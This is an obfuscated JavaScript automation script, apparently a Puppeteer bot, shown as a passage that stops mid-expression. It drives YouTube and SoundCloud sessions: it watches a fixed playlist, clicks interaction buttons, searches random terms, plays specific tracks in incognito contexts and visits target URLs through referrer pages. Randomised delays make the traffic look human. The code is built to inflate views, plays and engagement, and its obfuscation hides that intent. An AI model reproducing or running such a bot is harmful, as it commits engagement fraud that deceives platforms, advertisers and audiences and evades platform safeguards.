const a1 = b,
  a0 = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x534 + -0x118e + 0x16c3))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x2626 + 0x2b3 * -0xc + -0x5c2), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function a() {
  const bn = [
    'W6zjFSkaW7rXjY15WP4',
    'has',
    'C2vUza',
    'rg/en/scri',
    'https://ww',
    'lver-by-no',
    'thuFW50Fb3lcLLq9',
    'terview',
    'y2HPBgrYzw4',
    'fuHGW5xdS8o0W5nFWQldJq',
    'kN/dNCkbzCoaWRzMW6BdSG',
    'AgfZAa',
    'BwfUDwfSt3zLCG',
    '.l-listen-',
    'BgvUz3rO',
    'z2v0qxr0CMLIDq',
    'ts\x20rm,bts\x20',
    'wmoWE2RcJCoJW6/cQ8khea',
    'zxjdB250zxH0',
    'm_medium=t'
  ];
  a = function() {
    return bn;
  };
  return a();
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1 * -0xc9dc + -0x147 * 0x93 + -0x6719 * -0x1 + (0x2ff5 * 0x1 + 0x7ea * 0x4 + -0x1505) * random()) : await standardWaitForNetIdle(f), await wait(0x1b78 + -0x2 * -0xf1f + -0x16a * 0x1b + (0x9f7 * 0x1 + -0x1237 + -0x2f5 * -0x10) * random()), -0x1 * 0x837 + 0xa72 * 0x1 + -0x23a * 0x1;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x17e + 0x916 * -0x1 + 0x1b20), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x23b7 + 0x1 * 0x1979 + -0x3d2f;
}
async function randomWait() {
  return await wait(-0x1a19 + -0x14 * 0xb6 + 0x3bd9 + (-0x152c + -0x1529 * 0x1 + 0x3 * 0x149f) * random()), 0xf1 * 0x4 + 0x16ab * -0x1 + 0x12e8;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1fad + -0x114e + 0x30fb, -0x2 * -0x10b7 + -0x2 * -0x59e + -0x2ca3), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x19235 + 0x38fb + 0x2439a) * getRandomInt(-0xa79 + 0x112d + -0x6b2, 0x1d78 + -0x22d9 + 0x566), h)), -0x1 * -0x1fe1 + -0x14d9 + -0x1 * 0xb07;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1e5 * 0x13 + 0x9 * 0x393 + -0x442a;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x110 + -0x15aa + -0xd3 * -0x19]['split']('\x20');
    for (let k = -0x2110 + -0x1c * -0xc7 + 0x5a6 * 0x2; k < i['length']; k += -0x3d2 + -0x25f5 + 0x29c9)
      j += i[k] * h[i[k + (0x123c + -0xc7f + -0x5bc)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + R(0x9, 'PuLY') + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = c,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x486 + -0xe * -0x1e9 + 0x766 * -0x3)['map'](l => Array['from'](l[S(0x8)]))['flat'](0xdc3 + 0x235e * -0x1 + -0x4 * -0x567)['map'](l => l['childNodes'][0x1d37 + -0x20c6 + 0x390]['childNodes'][0x25 * -0x5a + -0xfa1 * -0x1 + -0x29f]['childNodes'][0x6cf * -0x5 + 0x86 * 0x1b + -0x2 * -0x9f5]['childNodes'][-0x16a9 + -0xb98 + 0x2241]['childNodes'][0x39 * -0x7 + 0x9d * -0x10 + 0xb60]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k[S(0xe)])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x218c + 0x1462 + -0x3206, -0x1329 + -0x7 * -0x3f4 + 0x1f * 0x5b)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x293 * 0x23 + 0x1ba + 0x92f7);
  const h = await getMaxTime(f),
    i = Math['min']((-0xcdfc + -0x7f8d + 0x7195 * 0x5) * getRandomInt(0x21cf + -0x626 + -0x1ba7, 0x5b8 + 0x1886 + -0x1e39), h);
  return await wait(i), -0x20f8 + -0x241 * 0x1 + -0xbbe * -0x3;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x736 + -0x14b * 0x17 + -0x1 * -0x1687]['children'][0x245c + -0x1fd4 + -0x488]['children'][-0x47b + 0x2542 + -0x20c7]['children'][0x1c7e + -0x1949 * 0x1 + 0x1 * -0x335]['children'][0xcbe + -0xd2a + 0xc * 0x9]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1d17 + -0x1fc + -0x1b1a;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x130d + -0x1 * -0xce6 + -0x3 * 0xa85 + (-0x238b + 0x4b3 * 0x2 + 0x1a57) * random()
  }), await wait(-0x1acd + -0x71e * -0x1 + 0x15a3 + (-0xe7b + -0x1 * -0x1672 + -0x6cb) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x4 * -0x29 + 0x2e * -0xa3 + 0x1df0]['childNodes'][0x7b7 + 0x1f6 * -0xb + -0x377 * -0x4]['childNodes'][-0x3f7 + 0x2023 + -0x1c2b * 0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x17c5 + 0x7be * 0x5 + -0xeec]['childNodes'][-0x1 * -0x1a9d + -0x1285 + -0x818]['childNodes'][-0xe57 * 0x1 + 0x2 * 0xc5f + 0x3 * -0x377]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1f81 + 0x154b + -0x1 * -0xa37),
          r = 0x1a73 + 0x1f04 + -0x3977;
        for (let u = -0x1481 * -0x1 + 0x161a * -0x1 + 0x199 * 0x1; u < q['length']; u += -0xa06 + 0x1 * -0x1be3 + 0x25eb * 0x1)
          r += q[u] * k[q[u + (-0x6d * -0x11 + -0x1334 * 0x2 + 0x11d * 0x1c)]];
        return r;
      }(n);
  });
  await wait((0x538b + 0x766 + 0x31 * -0xa9) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x3 * -0x31cf + -0x12844 + 0x17d37) * getRandomInt(-0x30 * -0x13 + -0x1 * 0x25e2 + 0x2253, -0x35 * 0x3b + 0x1c8f + -0x2 * 0x827), h + (-0x608 + 0x8 * -0x3b + 0x36d * 0x8));
  return await wait(i), -0x199f * -0x1 + 0x1 * 0x20e3 + -0x3a81;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x177b + 0x2 * 0xe66 + 0x1 * -0x3447), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xa6f * 0x1 + 0x2 * -0x8cd + -0x3c7 * -0x5 + (-0x254 + -0x4 * 0x97c + 0x2c2c) * Math['random']());
    });
  }, -0x2073 + -0x4f1 + 0x40bc);
  await wait(0x4566d + 0x17 * 0x836 + 0x7f67 * -0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x3274 * -0x5 + 0x1 * -0x2459 + 0x20afd) * getRandomInt(-0x301 * 0x3 + 0x1d05 + 0x2 * -0x9ff, 0x790 + 0x10 * 0x25f + 0x3b * -0xc5)), clearInterval(h), -0x1dbd + 0x2018 + 0x56 * -0x7;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x80 * -0x2f + 0x2545 + -0xdc5;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x16d * 0x11 + -0x3d * -0x82 + -0x2 * 0x35e;
    await randomWait();
  }
  return 0x25af * 0x1 + 0x97 * -0x34 + -0x702;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x3 * 0x602 + 0x140a + -0x2610);
    let h = e[f];
    if (c['LfnaJC'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x26 * -0x9e + -0x2ab + 0x2e7 * 0x9, r, s, t = 0x80f + 0xb * -0x1c4 + 0xb5d; s = m['charAt'](t++); ~s && (r = q % (-0x118e + -0x1f30 + -0x1861 * -0x2) ? r * (-0x9a * 0x8 + -0xafd * -0x3 + -0x1 * 0x1be7) + s : s, q++ % (-0x41 * -0x3 + 0x8 * -0x29c + 0x1421 * 0x1)) ? o += String['fromCharCode'](0xc2f + 0x201 * 0xd + -0x253d & r >> (-(-0x5f * -0x44 + -0x2 * 0x2a2 + 0x13f6 * -0x1) * q & -0x388 + 0x776 + 0x8 * -0x7d)) : 0x1 * -0x6c5 + 0x1402 + -0x1 * 0xd3d) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1 * 0x25b3 + 0x1ca * 0x7 + 0x192d, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x242e + 0xa84 + -0x2ea2))['slice'](-(-0x1f46 + 0x2699 + -0x751));
        }
        return decodeURIComponent(p);
      };
      c['qvoNjx'] = i, b = arguments, c['LfnaJC'] = !![];
    }
    const j = e[-0x1529 * 0x1 + 0x3 * -0x3ab + -0xb3 * -0x2e],
      k = f + j,
      l = b[k];
    return !l ? (h = c['qvoNjx'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function fetchRandomSC() {
  const T = d;
  return Math['random']() <= 0x1fbf + 0x21e + -0x21dd * 0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x533 * 0x6 + -0xa * -0xf + -0x1fc8 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + T(0x13) + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const V = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1a2f + 0x445 * 0x2 + -0x22b9 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x11f2 + -0x3 * 0x146 + -0xe20;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const U = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + U(0xd) + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x13120 + -0x9187 + -0x3 * -0x565 + getRandomInt(0x66b8 + 0x4faf * -0x1 + 0x1 * 0x238f, 0x3e6 * -0x10 + -0x246b * -0x6 + -0x7ca * 0x5));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x2 * -0xe63 + 0x8b2 + 0x17 * -0x1a1), r = await f['createInco' + 'gnitoBrows' + V(0x12)](), s = await r['newPage']();
      let u = 0x7c8 * 0x4 + -0x1d * -0xda + -0x37d2;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x20b1 + 0x573 + 0x1b3e, 0x1bd + 0xd6b + -0xef6)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1b61 + -0x1 * -0x56c + -0x18fd + floor((0xa60 + 0x73b + 0x491 * -0x3) * random()))), log('p2'), log(await s['evaluate'](() => {
        const X = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xfd82067e + -0x44734032 + 0x1c1f546b0),
          0x5 * 0x2b7f7d + -0xe7e0b * 0x3 + -0x2e0350,
          -0x6874 + 0x53c * 0x21 + 0x3bb8,
          -0x5e * 0x22 + -0xa6 * 0x19 + 0x1d32
        ], y = [
          -0x235c + -0x1550 + 0x38c4,
          0x2208 + -0x375 * 0x3 + -0x35f * 0x7,
          0x1255 + 0xcf6 + -0x1f43,
          -0x1f41 + 0x1e * 0x137 + -0x531
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x261f + -0x11 + -0xcaf * 0x3)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x1 * -0x24bf + -0x35 * -0x7d + 0xade; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x11f4 + -0x2274 + 0x1080) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x17 * -0x1a2 + -0x1c42 + -0x51 * -0xd0] = A[-0x1 * -0x9bd + -0x1ffb * -0x1 + 0x535 * -0x8] = A[-0x18b8 + -0x3c0 * 0x3 + 0x23f9 * 0x1] = A[0x87 + 0x29 * -0x68 + 0x1 * 0x1023] = A[0x1ca * -0x2 + -0x1 * -0xdea + -0xa53] = A[0x1 * 0x1e21 + -0x2047 + 0x115 * 0x2] = A[-0x1925 + 0x232c + -0xa02] = A[-0x205c + -0x30e + -0x237 * -0x10] = A[0xcde + -0x2615 + 0x193e] = A[-0x100b * -0x2 + -0x6ae + -0x1960] = A[0x13eb + 0x632 * 0x1 + 0x1 * -0x1a14] = A[0x2 * -0x132d + -0x1fba + 0x461e] = A[0x1c5f + -0x31 * -0x9d + 0xf5 * -0x3d] = A[0x2037 + 0xd85 * 0x1 + -0x2db0] = A[-0x126c + -0x1 * 0x1980 + 0x2bf9] = A[0x1d93 * -0x1 + -0x34f + -0x7c * -0x44] = A[0x43 * 0x4 + -0x4 * -0x85b + 0x2269 * -0x1] = -0x137b * -0x1 + -0x1ee5 + 0xb6a, this['blocks'] = A) : this['blocks'] = [
                0x1c57 * -0x1 + 0x420 + 0x1 * 0x1837,
                0xa * 0x3e3 + -0x3 * -0x3af + -0x31eb,
                0x18c1 + 0x2c8 + -0x1b89,
                -0x20 * -0xa7 + 0x8 * 0x152 + 0x10 * -0x1f7,
                0x263f + -0x1b2f + -0x18 * 0x76,
                0x19b9 + -0x237c + 0x9c3,
                0x75 * 0x37 + 0x270c + -0x402f,
                -0xb01 + 0x18c2 + -0xdc1 * 0x1,
                0x67e + -0xd46 + 0x6c8,
                0x3d1 + -0xf * -0x21b + -0x2366,
                -0x98d + 0x45a + -0xb * -0x79,
                -0x1b97 + -0x1ed5 + 0x3a6c * 0x1,
                0x1daa + -0x49e + -0x190c,
                -0x1 * -0x4ea + -0x954 * 0x4 + 0x2066,
                -0x8bc * 0x1 + 0x2558 + -0x1c9c,
                0x22d2 + -0x1 * -0x2593 + 0x4865 * -0x1,
                -0x2b * 0x6b + -0x25 * -0xe2 + -0xeb1 * 0x1
              ], this['h0'] = -0x1 * 0x4d607fdb + -0x45789ae2 + -0x7e4ada * -0x1fb, this['h1'] = -0x2257d0d5 + 0x7dc7d6c1 + 0x945da59d, this['h2'] = -0xe1ca8f4 + -0x1 * -0x10e6294a3 + -0x678b0eb1, this['h3'] = 0x189f1acf + 0x1cf06d63 + 0x12 * -0x213666e, this['h4'] = -0xfb9e6cde + -0x11d50649 + 0x1d1465517, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x214f * -0x1 + 0xb * -0x1eb + 0x3668 * 0x1, this['finalized'] = this['hashed'] = -0x1dc5 + -0x16e + 0x1f33, this['first'] = -0x4 * -0x22a + -0x1ab5 + 0x120e * 0x1;
            }
            ['update'](J) {
              const W = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1fbf + -0xa21 + -0x159e, O = J['length'] || 0x13b8 + -0x3 * 0xaad + -0x1 * -0xc4f, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x15 * -0x164 + -0xc7b + -0x10b9, P[-0x2326 + 0xa7e + 0x18a8] = this['block'], P[-0x1 * 0x1e58 + -0x225f + 0x40c7] = P[0x43c * -0x6 + -0x1f17 + 0x3880] = P[-0x13a7 + 0x1fe8 * 0x1 + -0xc3f] = P[0x1 * 0x1616 + 0xb8 * 0x1 + -0x16cb] = P[0x4ad + -0x919 * 0x1 + 0x470] = P[-0xd73 + 0xf * 0x187 + 0x1 * -0x971] = P[0xf0b * -0x2 + -0x1 * 0xb17 + 0xc7 * 0x35] = P[0x331 * -0x2 + 0xa * -0x131 + 0x1 * 0x1253] = P[-0x581 * 0x7 + -0x1 * 0xdd5 + 0x3464] = P[0x18c6 + 0xe * 0xd + -0x1973 * 0x1] = P[-0xb * -0x2e1 + -0x28 * 0xa2 + -0x651] = P[-0x2 * -0x483 + 0x1285 + 0x580 * -0x5] = P[-0x1652 + -0x1fd7 + 0x3635 * 0x1] = P[0x1686 + -0x6 * -0x1f1 + -0x221f] = P[0x7b6 + 0x1 * -0x1dec + -0x1 * -0x1644] = P[-0x709 + 0x488 + 0x290] = 0x232f + -0x13 * -0x6a + -0x2b0d), K) {
                    for (N = this['start']; M < O && N < 0x1 * 0x135 + 0x1403 + -0x14f8; ++M)
                      P[N >> -0x968 + 0x18c7 + 0x13 * -0xcf] |= J[M] << y[0xb * 0xa + -0x7 * 0x375 + -0x5f2 * -0x4 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x13bd * -0x1 + 0x1 * 0x9f9 + -0x1d76; ++M)
                      (L = J['charCodeAt'](M)) < -0x2cd + -0x1b1 * 0x14 + -0x5 * -0x76d ? P[N >> 0x242 * 0x8 + 0x97 * -0x25 + -0x5 * -0xc1] |= L << y[0x21d * -0x1 + 0x167 * -0x13 + 0x1eb * 0xf & N++] : L < 0x22b0 + 0x1 * -0xb93 + -0x1 * 0xf1d ? (P[N >> -0x5fe + 0x1 * -0x1c45 + -0x1 * -0x2245] |= (-0xfa1 + 0x1906 + -0x8a5 | L >> -0x2ab * -0xb + 0x14b * -0x9 + 0x2 * -0x8d8) << y[-0x10ae + -0x7 * -0x23 + 0xfbc & N++], P[N >> 0x1ee4 + 0x23db + -0x42bd] |= (-0x13b1 + 0x675 * 0x2 + 0x747 | 0x1a0c + -0x595 + -0x1438 * 0x1 & L) << y[0x17ff + 0x21b4 * -0x1 + 0x9b8 & N++]) : L < -0x898e + 0x11 * -0x1039 + 0x27557 || L >= -0x5 * -0x23f9 + 0x4c2d * 0x1 + 0x2 * -0x1005 ? (P[N >> -0x81 * -0x41 + -0x1bfd + -0x4c2] |= (-0x11 * -0x1eb + -0xabe + -0x14fd | L >> 0x1c0b * -0x1 + -0xd66 + 0x297d * 0x1) << y[-0x1e1f + -0x57e + 0x23a0 & N++], P[N >> 0xb * 0x203 + -0xb57 * 0x1 + -0xac8] |= (0x30 * -0x99 + -0x1 * 0x711 + 0x2441 | L >> -0x2 * -0xb71 + -0x371 * -0x5 + -0x2811 & 0x1f61 + -0x1ce9 + -0x239) << y[0x61 * -0x29 + 0x599 + 0x9f3 & N++], P[N >> -0x8eb * -0x1 + 0xd19 + -0x1 * 0x1602] |= (-0x14f2 * 0x1 + -0x2 * -0x59 + -0xa60 * -0x2 | -0x1459 * -0x1 + -0x15c5 + 0x1ab & L) << y[0x1 * -0x1b0e + -0xd * -0xc0 + -0x155 * -0xd & N++]) : (L = 0x6 * -0x1c1b + 0xaa10 + 0xfe92 + ((-0xdb2 + 0xc69 + 0x548 & L) << -0x2cc * -0xc + 0x14a * 0x9 + -0x2d20 | 0x13 * 0xa8 + 0x2576 + -0x2def & J['charCodeAt'](++M)), P[N >> -0x2f * -0x3b + 0x449 * -0x4 + 0x651] |= (0x125 * 0x7 + -0x1f * 0x25 + -0x298 | L >> 0x2d1 + 0x149d * -0x1 + 0x11de) << y[-0x75d + -0x1a5b + -0x6bf * -0x5 & N++], P[N >> -0x1509 + -0x26f3 + -0x892 * -0x7] |= (0x24af + 0x1df * -0xd + -0x42 * 0x2e | L >> -0xd7e + 0x3 * -0x95 + 0xf49 & -0x105e + 0x9 * -0x291 + 0x27b6) << y[0xd91 + -0x239 * -0xb + -0x2601 & N++], P[N >> 0xe43 + 0x1 * -0xf53 + 0x112] |= (-0x19ec + 0x1105 + 0x967 | L >> 0x1152 + 0x8 * 0x34d + -0x2bb4 & 0x1795 + -0xba7 + -0x3 * 0x3e5) << y[0x1 * 0x26e1 + -0x5 * 0x695 + -0x5f5 & N++], P[N >> -0x1d4e + -0x5a7 * 0x2 + 0x289e] |= (0x461 + -0xf1 * -0x4 + 0x1 * -0x7a5 | 0x103 * 0x12 + 0x14f9 + -0x26f0 & L) << y[-0xfc8 + -0x451 + 0x141c & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1 * 0x1094 + 0x1f19 + 0x119 * -0xd ? (this['block'] = P[-0x352 * -0x2 + -0xb76 + -0xfa * -0x5], this['start'] = N - (0x1773 + -0x18b3 * 0x1 + -0x60 * -0x4), this[W(0xb)](), this['hashed'] = -0x269e + -0x119 + 0x7c * 0x52) : this['start'] = N;
                }
                return this['bytes'] > 0x1 * 0x1b4f926ab + 0x1 * 0x5803a070 + -0x10cfcc71c && (this['hBytes'] += this['bytes'] / (-0x4 * 0x30ddfe0 + -0xd633f378 + 0x1e26b72f8) << -0xb * -0xb5 + -0x2d * -0xcc + -0x2ba3, this['bytes'] = this['bytes'] % (-0x20 * 0x28560c5 + -0x2 * -0x3372f506 + 0x2ec13c84 * 0x5)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x182e + -0x15da + -0x253;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1c11 + -0x4e0 + 0x2101] = this['block'], J[K >> 0x13c2 + 0x1184 + -0x2544] |= x[-0xe38 * 0x1 + -0x252e + -0x3 * -0x1123 & K], this['block'] = J[-0x15f4 + 0xd8a + -0x87a * -0x1], K >= -0x262d * 0x1 + -0x46 * 0x32 + 0x3411 && (this['hashed'] || this['hash'](), J[0x1c02 + -0x2 * -0x5f8 + -0x2 * 0x13f9] = this['block'], J[0xc48 + -0x1507 + -0x1 * -0x8cf] = J[-0x1 * 0x8ec + 0x2590 + -0x1ca3 * 0x1] = J[0x14b7 + 0xcbb * -0x1 + -0x7fa] = J[0x1664 + -0x1 * -0x7d3 + -0x1e34] = J[0x4 * 0x700 + -0x1d94 + -0x11 * -0x18] = J[-0x560 + -0x5 * -0x33e + -0xad1] = J[-0x4 * 0x28a + 0x5b9 * 0x5 + -0x126f] = J[-0xe3 * 0x7 + -0x2226 + 0x3 * 0xd76] = J[0x228b + -0x1 * -0x12a4 + -0x3527] = J[0x27e * 0xb + -0x1c7 + 0x1 * -0x199a] = J[-0xce4 + 0x17f6 + -0xb08] = J[-0x1187 * 0x2 + 0x2452 + -0x139] = J[-0x2b8 * -0x2 + -0x73 * 0x13 + 0x325] = J[-0x2024 + 0x156f + 0xac2] = J[0x14d0 + 0x656 + -0x1b18] = J[0x85 * -0x26 + -0x2 * -0x95f + 0x10f * 0x1] = 0x1 * 0xf63 + -0x26a7 + 0xba2 * 0x2), J[0x1 * -0x13e1 + -0x48e * -0x5 + -0x1 * 0x2d7] = this['hBytes'] << 0x273 * -0xb + 